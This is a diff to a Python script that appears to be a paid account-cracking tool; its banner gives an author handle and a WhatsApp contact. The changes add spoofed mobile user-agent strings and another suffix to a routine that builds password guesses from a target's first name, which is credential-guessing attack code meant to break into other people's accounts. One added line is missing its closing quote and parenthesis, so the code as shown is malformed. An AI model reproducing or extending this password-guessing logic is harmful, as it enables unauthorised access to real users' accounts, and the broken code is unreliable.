@@ -53,6 +53,9 @@ ua = ["Mozilla/5.0 (Linux; Android 10; G10+) AppleWebKit/537.36 (KHTML, like Gec
 ua = ["Mozilla/5.0 (Linux; Android 8.1.0; V155 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (Linux; Android 14; moto g04 Build/ULA34.89-100-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.99 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (Linux; Android 14; moto g24 Build/UTA34.82-36; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.99 Mobile Safari/537.36",]
+ua = ["Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; ; Lumia 929) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10149",]
+ua = ["Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/8.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 929) like Gecko",]
+ua = ["Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 929) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",]
 
  
 ugen2=[]
@@ -230,7 +233,7 @@ logo ="""
 ╠══[Github                   • \33[1;38mTutul-King ]   ║\33[1;34m   
 ╠══[Whatsapp                 • 01608843956 ]  ║\33[1;35m 
 ╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
-╠══[VERSION                  • 5.5 ]          ║\033[1;35m 
+╠══[VERSION                  • 5.7 ]          ║\033[1;35m 
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 os.system('clear')
 print(logo)
@@ -593,6 +596,7 @@ def passwrd():
                     pwv.append(frs+'@@##')
                     pwv.append('@'+frs+'@')
                     pwv.append(frs+'##')
+                    pwv.append(frs+'@#123')
                     pwv.append(frs+'1122')
                     pwv.append(frs+'11')
                     pwv.append(frs+'111')
@@ -619,6 +623,7 @@ def passwrd():
                     pwv.append(frs+'@@##')
                     pwv.append('@'+frs+'@')
                     pwv.append(frs+'##')
+                    pwv.append(frs+'@#123
                     pwv.append(frs+'1122')
                     pwv.append(frs+'11')
                     pwv.append(frs+'111')
